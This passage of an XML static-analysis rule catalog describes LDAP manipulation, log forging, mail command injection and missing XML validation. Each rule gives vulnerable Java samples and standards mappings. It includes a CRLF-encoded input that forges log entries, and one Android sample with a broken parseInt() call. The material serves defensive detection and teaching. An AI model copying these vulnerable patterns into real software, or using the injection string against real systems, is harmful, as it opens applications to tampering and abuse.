																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.6</em> <br></p>
																									   <p>[18] Standards Mapping - FIPS200 - (FISMA) <em>SI</em> <br></p>
																									   <p>[19] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-10 Information Input Validation (P1)</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>input-validation-and-representation</tag>
	</rule>
	<rule>
		<key>input_validation_and_representation_ldap_manipulation</key>
		<internalKey>Input Validation and Representation/LDAP Manipulation
		</internalKey>
		<name>LDAP Manipulation</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Executing an LDAP statement that contains a user-controlled value outside the filter string can allow an attacker to alter the statement's meaning or execute arbitrary LDAP commands.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  LDAP manipulation errors occur when:<br><br>1.	Data enters a program from an untrusted source.<br><br>2.	The data is used outside the filter string in a dynamic LDAP statement.<br><br><b>Example 1:</b> The following code reads a username and password from an HTTP request and uses it to perform an LDAP lookup.<br><br><pre><br>env.put(Context.SECURITY_AUTHENTICATION, "none");<br>DirContext ctx = new InitialDirContext(env);<br><br>String empID = request.getParameter("empID");<br><br>try<br>{<br>  BasicAttribute attr = new BasicAttribute("empID", empID);<br><br>  NamingEnumeration employee =<br>            ctx.search("ou=People,dc=example,dc=com",attr);<br>...<br></pre><br><br>Because the query includes user input and is performed under an anonymous bind, the query will return the details for any username specified, regardless of whether it matches the specified password. An attacker can effectively use the code below to lookup the details of any employee in the system, representing a serious privacy violation. The problem is that the developer failed to leverage the appropriate access control mechanisms necessary to restrict the query to access only employee records the current user is permitted to read.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A1 Unvalidated Input</em> <br></p>
																									   <p>[2] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3510 CAT I</em> <br></p>
																									   <p>[3] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3510 CAT I</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3510 CAT I</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3510 CAT I</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3510 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 90</em> <br></p>
																									   <p>[8] Standards Mapping - SANS Top 25 2009 - (SANS 2009) <em>Insecure Interaction - CWE ID 116</em> <br></p>
																									   <p>[9] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M1 Weak Server Side Controls</em> <br></p>
																									   <p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.3.1.1</em> <br></p>
																									   <p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[13] Standards Mapping - FIPS200 - (FISMA) <em>SI</em> <br></p>
																									   <p>[14] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-10 Information Input Validation (P1)</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>input-validation-and-representation</tag>
	</rule>
	<rule>
		<key>input_validation_and_representation_log_forging</key>
		<internalKey>Input Validation and Representation/Log Forging
		</internalKey>
		<name>Log Forging</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Writing unvalidated user input to log files can allow an attacker to forge log entries or inject malicious content into the logs.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Log forging vulnerabilities occur when:<br><br>1. Data enters an application from an untrusted source.<br><br>2. The data is written to an application or system log file.<br><br>Applications typically use log files to store a history of events or transactions for later review, statistics gathering, or debugging. Depending on the nature of the application, the task of reviewing log files may be performed manually on an as-needed basis or automated with a tool that automatically culls logs for important events or trending information.<br><br>Interpretation of the log files may be hindered or misdirected if an attacker can supply data to the application that is subsequently logged verbatim. In the most benign case, an attacker may be able to insert false entries into the log file by providing the application with input that includes appropriate characters. If the log file is processed automatically, the attacker can render the file unusable by corrupting the format of the file or injecting unexpected characters. A more subtle attack might involve skewing the log file statistics. Forged or otherwise, corrupted log files can be used to cover an attacker's tracks or even to implicate another party in the commission of a malicious act [1]. In the worst case, an attacker may inject code or other commands into the log file and take advantage of a vulnerability in the log processing utility [2].<br><br><b>Example 1:</b> The following web application code attempts to read an integer value from a request object. If the value fails to parse as an integer, then the input is logged with an error message indicating what happened.<br><br><pre><br>...<br>	String val = request.getParameter("val");<br>	try {<br>  		int value = Integer.parseInt(val);<br>	}<br>	catch (NumberFormatException nfe) {<br>  		log.info("Failed to parse val = " + val);<br>	}<br>...<br></pre><br><br>If a user submits the string "<code>twenty-one</code>" for <code>val</code>, the following entry is logged:<br><br><pre><br>INFO: Failed to parse val=twenty-one<br></pre><br><br>However, if an attacker submits the string "<code>twenty-one%0a%0aINFO:+User+logged+out%3dbadguy</code>", the following entry is logged:<br><br><pre><br>INFO: Failed to parse val=twenty-one<br><br>INFO: User logged out=badguy<br></pre><br><br>Clearly, attackers can use this same mechanism to insert arbitrary log entries.<br><br>Some think that in the mobile world, classic web application vulnerabilities, such as log forging, do not make sense -- why would the user attack themself? However, keep in mind that the essence of mobile platforms is applications that are downloaded from various sources and run alongside each other on the same device. The likelihood of running a piece of malware next to a banking application is high, which necessitates expanding the attack surface of mobile applications to include inter-process communication.<br><br><b>Example 2:</b> The following code adapts Example 1 to the Android platform.<br><br><pre><br>...<br>	String val = this.getIntent().getExtras().getString("val");<br>	try {<br>		int value = Integer.parseInt();<br>	}<br>	catch (NumberFormatException nfe) {<br>		Log.e(TAG, "Failed to parse val = " + val);<br>        }<br>...<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A1 Injection</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A1 Injection</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A1 Unvalidated Input</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A2 Injection Flaws</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3510 CAT I, APP3690.2 CAT II, APP3690.4 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3510 CAT I, APP3690.2 CAT II, APP3690.4 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3510 CAT I, APP3690.2 CAT II, APP3690.4 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3510 CAT I, APP3690.2 CAT II, APP3690.4 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3510 CAT I, APP3690.2 CAT II, APP3690.4 CAT II</em> <br></p>
																									   <p>[10] Standards Mapping - FIPS200 - (FISMA) <em>AU, SI</em> <br></p>
																									   <p>[11] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>AU-9 Protection of Audit Information (P1)</em> <br></p>
																									   <p>[12] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 117</em> <br></p>
																									   <p>[13] G. Hoglund, G. McGraw <em>Exploiting Software</em> Addison-Wesley<br></p>
																									   <p>[14] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M8 Security Decisions Via Untrusted Inputs</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.3.1.1, Requirement 6.5.2, Requirement 10.5.2</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.1, Requirement 10.5.2</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.1, Requirement 10.5.2</em> <br></p>
																									   <p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.1, Requirement 10.5.2</em> <br></p>
																									   <p>[19] A. Muffet <em>The night the log was forged.</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>input-validation-and-representation</tag>
	</rule>
	<rule>
		<key>input_validation_and_representation_log_forging__debug</key>
		<internalKey>Input Validation and Representation/Log Forging (debug)
		</internalKey>
		<name>Log Forging (debug)</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Writing unvalidated user input to log files can allow an attacker to forge log entries or inject malicious content into the logs.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Log forging vulnerabilities occur when:<br><br>1. Data enters an application from an untrusted source.<br><br>2. The data is written to an application or system log file.<br><br>Applications typically use log files to store a history of events or transactions for later review, statistics gathering, or debugging. Depending on the nature of the application, the task of reviewing log files may be performed manually on an as-needed basis or automated with a tool that automatically culls logs for important events or trending information.<br><br>Interpretation of the log files may be hindered or misdirected if an attacker can supply data to the application that is subsequently logged verbatim. In the most benign case, an attacker may be able to insert false entries into the log file by providing the application with input that includes appropriate characters. If the log file is processed automatically, the attacker can render the file unusable by corrupting the format of the file or injecting unexpected characters. A more subtle attack might involve skewing the log file statistics. Forged or otherwise, corrupted log files can be used to cover an attacker's tracks or even to implicate another party in the commission of a malicious act [1]. In the worst case, an attacker may inject code or other commands into the log file and take advantage of a vulnerability in the log processing utility [2].<br><br><b>Example 1:</b> The following web application code attempts to read an integer value from a request object. If the value fails to parse as an integer, then the input is logged with an error message indicating what happened.<br><br><pre><br>...<br>        String val = request.getParameter("val");<br>        try {<br>                int value = Integer.parseInt(val);<br>        }<br>        catch (NumberFormatException nfe) {<br>                log.info("Failed to parse val = " + val);<br>        }<br>...<br></pre><br><br>If a user submits the string "<code>twenty-one</code>" for <code>val</code>, the following entry is logged:<br><br><pre><br>INFO: Failed to parse val=twenty-one<br></pre><br><br>However, if an attacker submits the string "<code>twenty-one%0a%0aINFO:+User+logged+out%3dbadguy</code>", the following entry is logged:<br><br><pre><br>INFO: Failed to parse val=twenty-one<br><br>INFO: User logged out=badguy<br></pre><br><br>Clearly, attackers can use this same mechanism to insert arbitrary log entries.<br><br>Some think that in the mobile world, classic web application vulnerabilities, such as log forging, do not make sense -- why would the user attack themself? However, keep in mind that the essence of mobile platforms is applications that are downloaded from various sources and run alongside each other on the same device. The likelihood of running a piece of malware next to a banking application is high, which necessitates expanding the attack surface of mobile applications to include inter-process communication.<br><br><b>Example 2:</b> The following code adapts Example 1 to the Android platform.<br><br><pre><br>...<br>        String val = this.getIntent().getExtras().getString("val");<br>        try {<br>                int value = Integer.parseInt();<br>        }<br>        catch (NumberFormatException nfe) {<br>                Log.e(TAG, "Failed to parse val = " + val);<br>        }<br>...<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A1 Injection</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A1 Injection</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A1 Unvalidated Input</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A2 Injection Flaws</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3510 CAT I, APP3690.2 CAT II, APP3690.4 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3510 CAT I, APP3690.2 CAT II, APP3690.4 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3510 CAT I, APP3690.2 CAT II, APP3690.4 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3510 CAT I, APP3690.2 CAT II, APP3690.4 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3510 CAT I, APP3690.2 CAT II, APP3690.4 CAT II</em> <br></p>
																									   <p>[10] Standards Mapping - FIPS200 - (FISMA) <em>AU, SI</em> <br></p>
																									   <p>[11] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>AU-9 Protection of Audit Information (P1)</em> <br></p>
																									   <p>[12] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 117</em> <br></p>
																									   <p>[13] G. Hoglund, G. McGraw <em>Exploiting Software</em> Addison-Wesley<br></p>
																									   <p>[14] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M8 Security Decisions Via Untrusted Inputs</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.3.1.1, Requirement 6.5.2, Requirement 10.5.2</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.1, Requirement 10.5.2</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.1, Requirement 10.5.2</em> <br></p>
																									   <p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.1, Requirement 10.5.2</em> <br></p>
																									   <p>[19] A. Muffet <em>The night the log was forged.</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>input-validation-and-representation</tag>
	</rule>
	<rule>
		<key>input_validation_and_representation_mail_command_injection_imap
		</key>
		<internalKey>Input Validation and Representation/Mail Command
			Injection/IMAP
		</internalKey>
		<name>Mail Command Injection: IMAP</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Executing IMAP commands coming from an untrusted source can cause the IMAP server to execute malicious commands on behalf of an attacker.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  IMAP command injection vulnerabilities occur when an attacker can influence the commands sent to an IMAP mail server.<br><br>  1. Data enters the application from an untrusted source.<br>  <br>  2. The data is used as or as part of a string representing a command that is executed by the application.<br>  <br>  3. By executing the IMAP command, the attacker is able to instruct the server to carry out malicious actions such as sending spam.<br><br>  <b>Example 1:</b> The following code uses an HTTP request parameter to craft a <code>CREATE</code> command that is sent to the IMAP server. An attacker can use this parameter to modify the command sent to the server and inject new commands using CRLF characters.<br><br>  <pre><br>  ...<br>  final String foldername = request.getParameter("folder");<br>  IMAPFolder folder = (IMAPFolder) store.getFolder("INBOX");<br>  ...<br>  folder.doCommand(new IMAPFolder.ProtocolCommand() {<br>      @Override<br>      public Object doCommand(IMAPProtocol imapProtocol) throws ProtocolException {<br>          try {<br>              imapProtocol.simpleCommand("CREATE " + foldername, null);<br>          } catch (Exception e) {<br>              // Handle Exception<br>          }<br>          return null;<br>      }<br>  });<br>  ...<br>  </pre><br>  
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A1 Injection</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A1 Injection</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A2 Injection Flaws</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A6 Injection Flaws</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3510 CAT I, APP3570 CAT I</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3510 CAT I, APP3570 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3510 CAT I, APP3570 CAT I</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3510 CAT I, APP3570 CAT I</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3570 CAT I</em> <br></p>
																									   <p>[10] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 93</em> <br></p>
																									   <p>[11] Standards Mapping - SANS Top 25 2010 - (SANS 2010) <em>Insecure Interaction - CWE ID 078</em> <br></p>
																									   <p>[12] Standards Mapping - SANS Top 25 2011 - (SANS Top 25 2011) <em>Insecure Interaction - CWE ID 078</em> <br></p>
																									   <p>[13] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M1 Weak Server Side Controls</em> <br></p>
																									   <p>[14] Vicente Aguilera Díaz <em>MX Injection: Capturing and Exploiting Hidden Mail Servers</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.3.1.1, Requirement 6.5.2</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.6</em> <br></p>
																									   <p>[19] Standards Mapping - FIPS200 - (FISMA) <em>SI</em> <br></p>
																									   <p>[20] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-10 Information Input Validation (P1)</em> <br></p>
																									   <p>[21] OWASP <em>Testing for IMAP/SMTP Injection (OTG-INPVAL-011)</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>input-validation-and-representation</tag>
	</rule>
	<rule>
		<key>input_validation_and_representation_mail_command_injection_pop3
		</key>
		<internalKey>Input Validation and Representation/Mail Command
			Injection/POP3
		</internalKey>
		<name>Mail Command Injection: POP3</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Executing POP3 commands coming from an untrusted source can cause the POP3 server to execute malicious commands on behalf of an attacker.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  POP3 command injection vulnerabilities occur when an attacker can influence the commands sent to a POP3 mail server.<br><br>  1. Data enters the application from an untrusted source.<br>  <br>  2. The data is used as or as part of a string representing a command that is executed by the application.<br>  <br>  3. By executing the POP3 command, the attacker is able to instruct the server to carry out malicious actions such as sending spam.<br><br>  <b>Example 1:</b> The following code uses an HTTP request parameter to craft a <code>USER</code> and <code>PASS</code> command that is sent to the POP3 server. An attacker can use this parameter to modify the command sent to the server and inject new commands using CRLF characters.<br><br>  <pre><br>  ...<br>  String username = request.getParameter("username");<br>  String password = request.getParameter("password");<br>  ...<br>  POP3SClient pop3 = new POP3SClient(proto, false);<br>  pop3.login(username, password)<br>  ...<br>  </pre><br>  
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A1 Injection</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A1 Injection</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A2 Injection Flaws</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A6 Injection Flaws</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3510 CAT I, APP3570 CAT I</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3510 CAT I, APP3570 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3510 CAT I, APP3570 CAT I</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3510 CAT I, APP3570 CAT I</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3570 CAT I</em> <br></p>
																									   <p>[10] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 93</em> <br></p>
																									   <p>[11] Standards Mapping - SANS Top 25 2010 - (SANS 2010) <em>Insecure Interaction - CWE ID 078</em> <br></p>
																									   <p>[12] Standards Mapping - SANS Top 25 2011 - (SANS Top 25 2011) <em>Insecure Interaction - CWE ID 078</em> <br></p>
																									   <p>[13] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M1 Weak Server Side Controls</em> <br></p>
																									   <p>[14] Vicente Aguilera Díaz <em>MX Injection: Capturing and Exploiting Hidden Mail Servers</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.3.1.1, Requirement 6.5.2</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.6</em> <br></p>
																									   <p>[19] Standards Mapping - FIPS200 - (FISMA) <em>SI</em> <br></p>
																									   <p>[20] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-10 Information Input Validation (P1)</em> <br></p>
																									   <p>[21] OWASP <em>Testing for IMAP/SMTP Injection (OTG-INPVAL-011)</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>input-validation-and-representation</tag>
	</rule>
	<rule>
		<key>input_validation_and_representation_mail_command_injection_smtp
		</key>
		<internalKey>Input Validation and Representation/Mail Command
			Injection/SMTP
		</internalKey>
		<name>Mail Command Injection: SMTP</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Executing SMTP commands from an untrusted source can cause the SMTP server to execute malicious commands on behalf of an attacker.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  SMTP command injection vulnerabilities occur when an attacker can influence the commands sent to an SMTP mail server.<br><br>  1. Data enters the application from an untrusted source.<br>  <br>  2. The data is used as or as part of a string representing a command that is executed by the application.<br>  <br>  3. By executing the SMTP command, the attacker is able to instruct the server to carry out malicious actions such as sending spam.<br><br>  <b>Example 1:</b> The following code uses an HTTP request parameter to craft a <code>VRFY</code> command that is sent to the SMTP server. An attacker can use this parameter to modify the command sent to the server and inject new commands using CRLF characters.<br><br>  <pre><br>  ...<br>  String user = request.getParameter("user");<br>  SMTPSSLTransport transport = new SMTPSSLTransport(session,new URLName(Utilities.getProperty("smtp.server")));<br>  transport.connect(Utilities.getProperty("smtp.server"), username, password);<br>  transport.simpleCommand("VRFY " + user);<br>  ...<br>  </pre><br>  
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A1 Injection</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A1 Injection</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A2 Injection Flaws</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A6 Injection Flaws</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3510 CAT I, APP3570 CAT I</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3510 CAT I, APP3570 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3510 CAT I, APP3570 CAT I</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3510 CAT I, APP3570 CAT I</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3570 CAT I</em> <br></p>
																									   <p>[10] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 93</em> <br></p>
																									   <p>[11] Standards Mapping - SANS Top 25 2010 - (SANS 2010) <em>Insecure Interaction - CWE ID 078</em> <br></p>
																									   <p>[12] Standards Mapping - SANS Top 25 2011 - (SANS Top 25 2011) <em>Insecure Interaction - CWE ID 078</em> <br></p>
																									   <p>[13] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M1 Weak Server Side Controls</em> <br></p>
																									   <p>[14] Vicente Aguilera Díaz <em>MX Injection: Capturing and Exploiting Hidden Mail Servers</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.3.1.1, Requirement 6.5.2</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.6</em> <br></p>
																									   <p>[19] Standards Mapping - FIPS200 - (FISMA) <em>SI</em> <br></p>
																									   <p>[20] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-10 Information Input Validation (P1)</em> <br></p>
																									   <p>[21] OWASP <em>Testing for IMAP/SMTP Injection (OTG-INPVAL-011)</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>input-validation-and-representation</tag>
	</rule>
	<rule>
		<key>input_validation_and_representation_missing_xml_validation</key>
		<internalKey>Input Validation and Representation/Missing XML
			Validation
		</internalKey>
		<name>Missing XML Validation</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Failure to enable validation when parsing XML gives an attacker the opportunity to supply malicious input.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Most successful attacks begin with a violation of the programmer's assumptions. By accepting an XML document without validating it against a DTD or XML schema, the programmer leaves a door open for attackers to provide unexpected, unreasonable, or malicious input. It is not possible for an XML parser to validate all aspects of a document's content; a parser cannot understand the complete semantics of the data. However, a parser can do a complete and thorough job of checking the document's structure and therefore guarantee to the code that processes the document that the content is well-formed.<br>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A1 Injection</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A1 Injection</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A1 Unvalidated Input</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A2 Injection Flaws</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3510 CAT I</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3510 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3510 CAT I</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3510 CAT I</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3510 CAT I</em> <br></p>
																									   <p>[10]  <em>Axis User's Guide</em> Apache Software Foundation<br></p>
																									   <p>[11] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 112</em> <br></p>
																									   <p>[12] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M7 Client Side Injection</em> <br></p>
																									   <p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.3.1.1, Requirement 6.5.2</em> <br></p>
																									   <p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.1</em> <br></p>
